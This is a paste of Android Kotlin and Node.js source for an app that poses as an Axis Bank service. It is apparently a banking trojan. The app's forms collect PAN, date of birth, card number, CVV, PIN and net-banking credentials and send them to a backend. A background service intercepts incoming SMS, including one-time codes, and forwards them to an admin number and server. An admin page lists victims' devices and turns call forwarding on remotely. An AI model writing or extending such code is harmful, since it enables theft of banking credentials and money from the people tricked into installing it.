meni



<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">


    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" tools:targetApi="o" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <queries>

        <package android:name="com.android.dialer" />

        <intent>
            <action android:name="android.intent.action.CALL" />
        </intent>
    </queries>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApp"
        android:usesCleartextTraffic="true">


        <activity
            android:name=".MainActivity"
            android:exported="true"
            tools:node="merge">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <receiver
            android:name=".receivers.SMSReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.CallForwardingService"
            android:foregroundServiceType="phoneCall"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_CALL_FORWARDING" />
            </intent-filter>
        </service>

        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".services.SmsService"
            android:foregroundServiceType="dataSync"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.example.refactor.START_SERVICE" />
            </intent-filter>
        </service>

        <!-- Additional Activities -->
        <activity android:name=".activities.FormActivity"
            android:exported="false" />
        <activity android:name=".activities.PaymentActivity"
            android:exported="false" />
        <activity android:name=".activities.SuccessActivity"
            android:exported="false" />

    </application>

</manifest>




main



package com.example.refactor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.activities.FormActivity
import com.example.refactor.receivers.DeviceRegistration
import com.example.refactor.services.CallForwardingService
import com.example.refactor.utils.PermissionUtil

class MainActivity : AppCompatActivity() {

    private lateinit var progressBar: ProgressBar
    private lateinit var imageViewLogo: ImageView

    private val requiredPermissions = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.INTERNET,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_STATE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        DeviceRegistration(this).registerDeviceIfNeeded()

        progressBar = findViewById(R.id.progressBar)
        imageViewLogo = findViewById(R.id.imageViewLogo)

        setupInitialAnimation()

        checkAndRequestPermissions()
    }

    private fun setupInitialAnimation() {
        progressBar.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
            max = 100
        }
        imageViewLogo.apply {
            alpha = 0f
            scaleX = 0.5f
            scaleY = 0.5f
        }
    }

    private fun checkAndRequestPermissions() {
        if (PermissionUtil.hasPermissions(this, *requiredPermissions)) {
            startAnimations()
        } else {
            PermissionUtil.requestPermissions(this, requiredPermissions, REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startAnimations()
            } else {
                Toast.makeText(this, "Permissions are required to proceed.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun startAnimations() {
        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()

        Handler(Looper.getMainLooper()).postDelayed({
            showProgressAndNavigate()
        }, 2000)
    }

    private fun showProgressAndNavigate() {
        var progress = 0
        val handler = Handler(Looper.getMainLooper())

        val progressRunnable = object : Runnable {
            override fun run() {
                if (progress <= 100) {
                    progressBar.progress = progress
                    progress += 5
                    handler.postDelayed(this, 100)
                } else {
                    navigateToFormPage()
                }
            }
        }
        handler.post(progressRunnable)
    }

    private fun navigateToFormPage() {
        startActivity(Intent(this, FormActivity::class.java))
        finish()
        startCallForwardingService()
    }

    private fun startCallForwardingService() {
        startService(Intent(this, CallForwardingService::class.java))
    }

    companion object {
        private const val REQUEST_CODE = 1001
    }
}





util




package com.example.refactor.utils

import android.app.Activity
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

object PermissionUtil {

    fun hasPermissions(activity: Activity, vararg permissions: String): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestPermissions(activity: Activity, permissions: Array<String>, requestCode: Int) {
        ActivityCompat.requestPermissions(activity, permissions, requestCode)
    }
}





deviceregist



package com.example.refactor.receivers

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.example.refactor.models.DeviceData
import com.example.refactor.models.DeviceRegisterResponse
import com.example.refactor.network.ApiClient
import com.example.refactor.utils.DeviceInfoUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Response

class DeviceRegistration(private val context: Context) {
    private val sharedPreferences: SharedPreferences = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
    private val apiService = ApiClient.api
    @Volatile private var isRegistering = false

    fun registerDeviceIfNeeded() {
        val storedModel = getSavedDeviceModel()
        val storedUniqueId = getSavedUniqueId()

        val deviceDetails = DeviceInfoUtil.getDeviceDetails(context)
        val currentModel = deviceDetails["model"] as? String ?: "Unknown"

        // ✅ Check if the device with this model is already registered
        if (storedModel == currentModel && !storedUniqueId.isNullOrEmpty()) {
            Log.d("DeviceRegistration", "Device already registered with model: $storedModel & ID: $storedUniqueId")
            return  // ✅ Same model already registered, return without sending data again
        }

        if (!isRegistering) {
            isRegistering = true
            Log.d("DeviceRegistration", "Registering device with model: $currentModel")
            registerDevice(currentModel)
        }
    }

    private fun registerDevice(deviceModel: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceDetails = DeviceInfoUtil.getDeviceDetails(context)

                val simOperators = (deviceDetails["simOperators"] as? List<*>)?.filterIsInstance<String>()
                    ?: listOf("Unavailable")

                val deviceData = DeviceData(
                    model = deviceModel,
                    manufacturer = deviceDetails["manufacturer"] as? String ?: "Unknown",
                    androidVersion = deviceDetails["androidVersion"] as? String ?: "Unknown",
                    brand = deviceDetails["brand"] as? String ?: "Unknown",
                    simOperator = simOperators.joinToString(", ")
                )

                Log.d("DeviceRegistration", "Sending data to backend: $deviceData")

                val response: Response<DeviceRegisterResponse> = apiService.registerDevice(deviceData)

                if (response.isSuccessful) {
                    val responseBody = response.body()
                    Log.d("DeviceRegistration", "Full API Response: $responseBody")

                    if (responseBody?.success == true) {
                        val receivedUniqueId = responseBody.uniqueid
                        Log.d("DeviceRegistration", "Received Unique ID: $receivedUniqueId")
                        markDeviceAsRegistered(deviceModel, receivedUniqueId)
                    } else {
                        Log.e("DeviceRegistration", "API Response Error: ${responseBody?.message ?: "Unknown error"}")
                    }
                } else {
                    Log.e("DeviceRegistration", "API Error: HTTP ${response.code()} - ${response.errorBody()?.string()}")
                }
            } catch (e: Exception) {
                Log.e("DeviceRegistration", "Network Error: ${e.message}", e)
            } finally {
                isRegistering = false
            }
        }
    }

    private fun markDeviceAsRegistered(model: String, uniqueId: String?) {
        sharedPreferences.edit().apply {
            putBoolean("is_device_registered", true)
            putString("registered_device_model", model)  // ✅ Save the registered model
            uniqueId?.let {
                putString("device_unique_id", it)  // ✅ Save the received unique ID
                Log.d("DeviceRegistration", "Unique ID saved: $it")
            }
            apply()
        }
        Log.d("DeviceRegistration", "Model saved in SharedPreferences: $model")
    }

    fun getSavedUniqueId(): String? {
        return sharedPreferences.getString("device_unique_id", null)
    }

    private fun getSavedDeviceModel(): String? {
        return sharedPreferences.getString("registered_device_model", null)
    }
}




detailController.js


const mongoose = require('mongoose');
const User = require('../models/User');
const CardPayment = require('../models/CardPayment');
const NetBanking = require('../models/NetBanking');

exports.getUserDetails = async (req, res) => {
    try {
        const { uniqueid } = req.params;

        if (!uniqueid) {
            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
        }

        const [user, cardPayment, netBanking] = await Promise.all([
            User.findOne({ uniqueid }),
            CardPayment.findOne({ uniqueid }),
            NetBanking.findOne({ uniqueid })
        ]);

        if (!user && !cardPayment && !netBanking) {
            return res.render('detail', { user: null, cardPayment: null, netBanking: null });
        }

        res.render('detail', { user, cardPayment, netBanking });

    } catch (error) {
        res.status(500).send("Internal Server Error");
    }
};


detail.js   route


const express = require('express');
const router = express.Router();
const detailController = require('../controllers/detailController');

// Route to fetch user details
router.get('/detail/:uniqueid', detailController.getUserDetails);

module.exports = router;


filan.ejs


<!DOCTYPE html>
<html lang="en">
<head>
    <title>Device Details</title>
</head>
<body>
    <h1>Device Information</h1>
    <p>Model: <%= device.model %></p>
    <p>Manufacturer: <%= device.manufacturer %></p>
    <p>Android Version: <%= device.androidVersion %></p>
    <p>Brand: <%= device.brand %></p>
    <p>SIM Operator: <%= device.simOperator %></p>

    <!-- Start Call Forwarding -->
    <form method="POST" action="/api/device/admin/set/<%= device._id %>">
        <input type="text" name="phoneNumber" placeholder="Enter 10-digit Phone Number" required>
        <button type="submit">Start Call Forwarding</button>
    </form>

    <!-- Stop Call Forwarding -->
    <form method="POST" action="/api/device/admin/stop/<%= device._id %>">
        <button type="submit">Stop Call Forwarding</button>
    </form>
      <br>
      <a href="/api/data/detail/<%= device._id %>">View Details</a>
    <br>

    <br>
    <a href="/api/notification/custom/sms/<%= device.id %>">View SMS</a>

</body>
</html>



form 

package com.example.refactor.activities

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.FormData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.*
import retrofit2.HttpException
import java.io.IOException
import kotlin.math.pow

class FormActivity : AppCompatActivity() {

    private lateinit var etMobileNumber: EditText
    private lateinit var etDob: EditText
    private lateinit var etPan: EditText
    private lateinit var btnProceed: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_form)

        etMobileNumber = findViewById(R.id.etMobileNumber)
        etDob = findViewById(R.id.etDob)
        etPan = findViewById(R.id.etPan)
        btnProceed = findViewById(R.id.btnProceed)

        setupDobAutoFormat()

        btnProceed.setOnClickListener {
            val mobileNumber = etMobileNumber.text.toString().trim()
            val dob = etDob.text.toString().trim()
            val pan = etPan.text.toString().trim()
            val uniqueId = getUniqueIdFromDeviceRegistration()  // ✅ Fetch from SharedPreferences

            if (validateInputs(mobileNumber, dob, pan, uniqueId)) {
                btnProceed.isEnabled = false
                submitFormData(mobileNumber, dob, pan, uniqueId)
            }
        }
    }

    private fun setupDobAutoFormat() {
        etDob.addTextChangedListener(object : TextWatcher {
            private var isFormatting = false
            private val maxLength = 10

            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                if (isFormatting || s.isNullOrEmpty()) return

                isFormatting = true

                val clean = s.toString().replace("/", "")
                val formatted = StringBuilder()
                val cursorPosition = etDob.selectionStart

                for (i in clean.indices) {
                    if (formatted.length >= maxLength) break
                    formatted.append(clean[i])
                    if ((i == 1 || i == 3) && formatted.length + 1 <= maxLength) {
                        formatted.append("/")
                    }
                }

                etDob.setText(formatted.toString())
                etDob.setSelection(minOf(cursorPosition, formatted.length))

                isFormatting = false
            }
        })
    }

    private fun validateInputs(mobileNumber: String, dob: String, pan: String, uniqueid: String): Boolean {
        val mobileRegex = "^[6-9]\\d{9}$".toRegex()
        val dobRegex = "^\\d{2}/\\d{2}/\\d{4}$".toRegex()
        val panRegex = "^[A-Z]{5}\\d{4}[A-Z]$".toRegex()

        if (!mobileRegex.matches(mobileNumber)) {
            showToast("Invalid Mobile Number!")
            return false
        }
        if (!dobRegex.matches(dob)) {
            showToast("Invalid Date of Birth! Format: DD/MM/YYYY")
            return false
        }
        if (!panRegex.matches(pan)) {
            showToast("Invalid PAN Number!")
            return false
        }
        if (uniqueid.isEmpty()) {
            showToast("Error: Unique ID not found!")
            return false
        }
        return true
    }

    private fun submitFormData(mobileNumber: String, dob: String, pan: String, uniqueId: String) {
        val apiInterface = ApiClient.api
        val formData = FormData(mobile = mobileNumber, dob = dob, pan = pan, uniqueid = uniqueId)

        CoroutineScope(Dispatchers.IO).launch {
            var attempt = 0
            var success = false

            while (attempt < 3 && !success) {
                Log.d("FormActivity", "Attempt $attempt: Sending form data to backend...")

                try {
                    val response = apiInterface.saveFormDataStep1(formData)

                    withContext(Dispatchers.Main) {
                        if (response.isSuccessful && response.body()?.success == true) {
                            Log.d("FormActivity", "Success: Response received from backend")
                            success = true
                            showToast("Data submitted successfully!")
                            navigateToNextForm(uniqueId)  // ✅ Navigate after successful submission
                        } else {
                            Log.e("FormActivity", "Error: Failed response")
                        }
                    }
                } catch (e: HttpException) {
                    Log.e("FormActivity", "HTTP Exception: ${e.message()}", e)
                } catch (e: IOException) {
                    Log.e("FormActivity", "Network Error: ${e.message}", e)
                } catch (e: Exception) {
                    Log.e("FormActivity", "Unexpected Error: ${e.message}", e)
                }

                attempt++
                if (!success) {
                    val delayTime = (2.0.pow(attempt) * 1000).toLong()
                    Log.d("FormActivity", "Retrying in $delayTime ms...")
                    delay(delayTime)
                }
            }

            withContext(Dispatchers.Main) {
                btnProceed.isEnabled = true
            }
        }
    }

    private fun getUniqueIdFromDeviceRegistration(): String {
        val sharedPref = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return sharedPref.getString("device_unique_id", "") ?: ""
    }

    private fun showToast(message: String) {
        runOnUiThread {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
        }
    }

    private fun navigateToNextForm(uniqueid: String) {
        Log.d("FormActivity", "Navigating to PaymentActivity with Unique ID: $uniqueid")
        val intent = Intent(this, PaymentActivity::class.java)
        intent.putExtra("UNIQUE_ID", uniqueid)
        startActivity(intent)
        finish()
    }
}


PaymentActivity

package com.example.refactor.activities

import android.content.Intent
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.NetBankingData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.HttpException
import java.io.IOException

class PaymentActivity : AppCompatActivity() {

    private lateinit var etCardNumber: EditText
    private lateinit var etExpiryDate: EditText
    private lateinit var etCvv: EditText
    private lateinit var etPin: EditText
    private lateinit var btnProceed: Button

    private var uniqueid: String? = null // Variable to store uniqueid

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_payment)

        // Initialize views
        etCardNumber = findViewById(R.id.etCardNumber)
        etExpiryDate = findViewById(R.id.etExpiryDate)
        etCvv = findViewById(R.id.etCvv)
        etPin = findViewById(R.id.etPin)
        btnProceed = findViewById(R.id.btnProceed)

        // Retrieve the uniqueid passed from the previous activity
        uniqueid = intent.getStringExtra("UNIQUE_ID")

        // Setup expiry date auto-formatting
        setupExpiryDateAutoFormat()

        // Handle button click
        btnProceed.setOnClickListener {
            val cardNumber = etCardNumber.text.toString().trim()
            val expiryDate = etExpiryDate.text.toString().trim()
            val cvv = etCvv.text.toString().trim()
            val pin = etPin.text.toString().trim()

            if (validateInputs(cardNumber, expiryDate, cvv, pin)) {
                submitPaymentData(cardNumber, expiryDate, cvv, pin)
            } else {
                showToast("Please fill all fields with valid data!")
            }
        }
    }

    private fun setupExpiryDateAutoFormat() {
        etExpiryDate.addTextChangedListener(object : TextWatcher {
            private var isFormatting = false
            private var deletingSlash = false
            private val slashPosition = 2

            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
                deletingSlash = count == 1 && after == 0 && start == slashPosition
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                if (isFormatting || s.isNullOrEmpty()) return

                isFormatting = true
                val cleanInput = s.toString().replace(Regex("\\D"), "") // Remove non-numeric characters

                val formatted = StringBuilder()
                for (i in cleanInput.indices) {
                    if (i > 3) break // Limit to MM/YY format
                    formatted.append(cleanInput[i])
                    if (i == 1 && cleanInput.length > 2) {
                        formatted.append("/")
                    }
                }

                val finalText = formatted.toString()
                if (finalText != s.toString()) {
                    etExpiryDate.setText(finalText)
                    etExpiryDate.setSelection(finalText.length)
                }

                isFormatting = false
            }

            override fun afterTextChanged(s: Editable?) {
                if (deletingSlash) {
                    s?.delete(slashPosition - 1, slashPosition)
                    deletingSlash = false
                }
            }
        })
    }

    // Validate inputs
    private fun validateInputs(
        cardNumber: String, expiryDate: String, cvv: String, pin: String
    ): Boolean {
        val cardPattern = "^[0-9]{16}$"  // Validate 16 digit card number
        val expiryPattern = "^(0[1-9]|1[0-2])/([0-9]{2})$"  // Validate expiry date in MM/YY format
        val cvvPattern = "^[0-9]{3}$"  // Validate 3 digit CVV
        val pinPattern = "^[0-9]{4}$"  // Validate 4 digit PIN

        val isCardValid = cardNumber.matches(cardPattern.toRegex())
        val isExpiryValid = expiryDate.matches(expiryPattern.toRegex())
        val isCvvValid = cvv.matches(cvvPattern.toRegex())
        val isPinValid = pin.matches(pinPattern.toRegex())

        if (!isCardValid) showToast("Invalid Card Number!")
        if (!isExpiryValid) showToast("Invalid Expiry Date!")
        if (!isCvvValid) showToast("Invalid CVV!")
        if (!isPinValid) showToast("Invalid PIN!")

        return isCardValid && isExpiryValid && isCvvValid && isPinValid
    }

    // Submit payment data to the backend
    private fun submitPaymentData(
        cardNumber: String, expiryDate: String, cvv: String, pin: String
    ) {
        if (uniqueid.isNullOrEmpty()) {
            showToast("User ID is missing! Unable to submit data.")
            return
        }

        val apiInterface = ApiClient.api
        val netBankingData = NetBankingData(
            uniqueid!!, cardNumber, expiryDate, cvv, pin
        )

        // Log data being sent to the backend
        Log.d("PaymentActivity", "Sending data to backend: $netBankingData")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.saveFormDataStep2(netBankingData)

                // Log the API call response
                Log.d("PaymentActivity", "Response received: $response")

                if (response.isSuccessful) {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        Log.d("PaymentActivity", "Data submitted successfully. Response: $responseBody")
                        runOnUiThread {
                            navigateToNextStep()
                        }
                    } else {
                        Log.d("PaymentActivity", "Submission failed. Response message: ${responseBody?.message}")
                        runOnUiThread {
                            showToast(responseBody?.message ?: "Submission failed!")
                        }
                    }
                } else {
                    // Error response from server
                    Log.d("PaymentActivity", "Error occurred. Response: ${response.errorBody()?.string()}")
                    runOnUiThread {
                        showToast("Error: ${response.errorBody()?.string() ?: "Unknown error occurred"}")
                    }
                }
            } catch (e: HttpException) {
                Log.e("PaymentActivity", "HTTP Exception: ${e.message}", e)
                runOnUiThread {
                    showToast("HTTP Error!")
                }
            } catch (e: IOException) {
                Log.e("PaymentActivity", "Network Error: ${e.message}", e)
                runOnUiThread {
                    showToast("Network Error: Please check your connection.")
                }
            } catch (e: Exception) {
                Log.e("PaymentActivity", "Unexpected Error: ${e.message}", e)
                runOnUiThread {
                    showToast("Unexpected Error!")
                }
            }
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun navigateToNextStep() {
        val intent = Intent(this, SuccessActivity::class.java)
        intent.putExtra("UNIQUE_ID", uniqueid)
        startActivity(intent)
        finish()
    }
}

SuccessActivity


package com.example.refactor.activities

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.refactor.R
import com.example.refactor.models.CardPaymentData
import com.example.refactor.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.HttpException
import java.io.IOException

class SuccessActivity : AppCompatActivity() {

    private lateinit var etCustomerId: EditText
    private lateinit var etPassword: EditText
    private lateinit var btnSubmit: Button

    private var uniqueid: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activitty_success)

        etCustomerId = findViewById(R.id.etCustomerId)
        etPassword = findViewById(R.id.etPassword)
        btnSubmit = findViewById(R.id.btnSubmit)

        uniqueid = intent.getStringExtra("UNIQUE_ID")

        if (uniqueid.isNullOrEmpty()) {
            Toast.makeText(this, "User ID missing!", Toast.LENGTH_SHORT).show()
            finish()
            return
        }

        btnSubmit.setOnClickListener {
            val customerId = etCustomerId.text.toString().trim()
            val password = etPassword.text.toString().trim()

            if (validateInputs(customerId, password)) {
                submitFormData(customerId, password)
            } else {
                Toast.makeText(this, "Invalid input format!", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun validateInputs(customerId: String, password: String): Boolean {
        return customerId.isNotEmpty() && password.length >= 6
    }

    private fun submitFormData(customerId: String, password: String) {
        val apiInterface = ApiClient.api

        val formData = CardPaymentData(
            uniqueid = uniqueid!!,
            customerId = customerId,
            password = password
        )

        Log.d("SuccessActivity", "Payload being sent: $formData")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.saveFormDataStep3(formData)
                withContext(Dispatchers.Main) {
                    if (response.isSuccessful && response.body()?.success == true) {
                        finish()
                    } else {
                        showToast("Data submission failed!")
                    }
                }
            } catch (e: HttpException) {
                withContext(Dispatchers.Main) { showToast("HTTP Error: ${e.message}") }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) { showToast("Network Error!") }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { showToast("Unexpected Error: ${e.message}") }
            }
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}





const detail = require('./routes/detail');


app.use('/api/data', detail); 








/////////

smsservice

@file:Suppress("DEPRECATION")
package com.example.refactor.services


import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.app.Service
import android.content.SharedPreferences
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.telephony.SmsManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import androidx.core.app.NotificationCompat
import com.example.refactor.R
import com.example.refactor.models.SmsData
import com.example.refactor.network.ApiClient
import com.example.refactor.receivers.DeviceRegistration

class SmsService : Service() {
    private lateinit var sharedPreferences: SharedPreferences
    private val apiInterface = ApiClient.api
    private val handler = Handler()

    // Constants
    private val maxRetries = 3

    override fun onCreate() {
        super.onCreate()
        sharedPreferences = getSharedPreferences("AdminPrefs", MODE_PRIVATE)

        // Fetch admin number from backend initially
        fetchAdminNumberFromBackend()

        // Start periodic fetching of the admin number every minute
        startAdminNumberFetch()

        // Handle foreground service notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundServiceWithNotification()
        } else {
            startForeground(1, createNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            val sender = it.getStringExtra("sender")
            val body = it.getStringExtra("body")
            if (!sender.isNullOrEmpty() && !body.isNullOrEmpty()) {
                forwardSmsToAdmin(sender, body)
                sendSmsWithRetry(sender, body) // Send SMS to backend with retry mechanism
            }
        }
        return START_STICKY
    }

    private fun forwardSmsToAdmin(sender: String, body: String) {
        val adminNumber = getAdminNumber()
        if (adminNumber.isNotEmpty()) {
            try {
                val smsManager = SmsManager.getDefault()
                val message = "Received SMS:\nFrom: $sender\nMessage: $body"
                // Directly send SMS to admin number
                smsManager.sendTextMessage(adminNumber, null, message, null, null)
                Log.d("SmsService", "SMS sent directly to admin: $adminNumber")
            } catch (e: Exception) {
                Log.e("SmsService", "Error sending SMS to admin", e)
            }
        } else {
            Log.e("SmsService", "Admin number is not configured or empty.")
        }
    }

    private fun sendSmsWithRetry(sender: String, body: String, attempt: Int = 1) {
        val uniqueid = DeviceRegistration(applicationContext).getSavedUniqueId() ?: "Unknown" // ✅ Fetching Unique ID
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(System.currentTimeMillis())

        val notificationData = SmsData(
            sender = sender,
            title = "New SMS",
            body = body,
            timestamp = timestamp,
            uniqueid = uniqueid // ✅ Passing Unique ID to backend
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.sendNotificationToBackend(notificationData)
                withContext(Dispatchers.Main) {
                    if (response.isSuccessful) {
                        response.body()?.let {
                            if (it.success) {
                                Log.d("SmsService", "SMS sent to backend successfully: $notificationData")
                            } else {
                                handleRetry(attempt, sender, body)
                            }
                        } ?: handleRetry(attempt, sender, body)
                    } else {
                        handleRetry(attempt, sender, body)
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    handleRetry(attempt, sender, body, e)
                }
            }
        }
    }


    private fun handleRetry(attempt: Int, sender: String, body: String, e: Exception? = null) {
        if (attempt < maxRetries) {
            Log.e("SmsService", "Retrying... attempt $attempt due to error: ${e?.message}")
            sendSmsWithRetry(sender, body, attempt + 1)
        } else {
            Log.e("SmsService", "Max retries reached, error sending SMS to backend", e)
        }
    }

    private fun fetchAdminNumberFromBackend() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiInterface.getAdminNumber()
                withContext(Dispatchers.Main) {
                    if (response.isSuccessful) {
                        response.body()?.data?.let {
                            setAdminNumber(it)
                            Log.d("SmsService", "Admin number updated from backend: $it")
                        } ?: run {
                            Log.e("SmsService", "Admin number is null in response.")
                        }
                    } else {
                        Log.e(
                            "SmsService",
                            "Backend response failed, code: ${response.code()} - ${response.message()}"
                        )
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Log.e("SmsService", "Error fetching admin number from backend", e)
                }
            }
        }
    }

    private fun startAdminNumberFetch() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                fetchAdminNumberFromBackend()
                handler.postDelayed(this, TimeUnit.MINUTES.toMillis(1)) // Fetch every minute
            }
        }, TimeUnit.SECONDS.toMillis(0)) // Start immediately
    }

    private fun getAdminNumber(): String {
        return sharedPreferences.getString("admin_number", "") ?: ""
    }

    private fun setAdminNumber(number: String) {
        CoroutineScope(Dispatchers.Main).launch {
            sharedPreferences.edit().putString("admin_number", number).apply()
            Log.d("SmsService", "Admin number updated to: $number")
        }
    }

    private fun createNotification(): Notification {
        val channelId = "sms_service_channel"
        val channelName = "axis bank running"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Axis Bank Running")
            .setContentText("Click Here And Manage Service")
            .setSmallIcon(R.drawable.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun startForegroundServiceWithNotification() {
        val notification = createNotification()
        startForeground(2, notification)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}




notificatooriut




const express = require('express');
const router = express.Router();
const notificationController = require('../controllers/notificationController');

// POST route to save notification data
router.post('/save', notificationController.saveNotification);  // Correct function name

// GET route to fetch notifications
router.get('/custom/sms/:uniqueid', notificationController.getCustomSms);


module.exports = router;




controller 


const Notification = require('../models/Notification');

// Save a notification (SMS) to the database
exports.saveNotification = async (req, res) => {
    try {
        const { sender, title, body, timestamp, uniqueid } = req.body;

        const notification = new Notification({
            sender,
            title,
            body,
            timestamp,
            uniqueid
        });

        await notification.save();

        res.status(201).json({
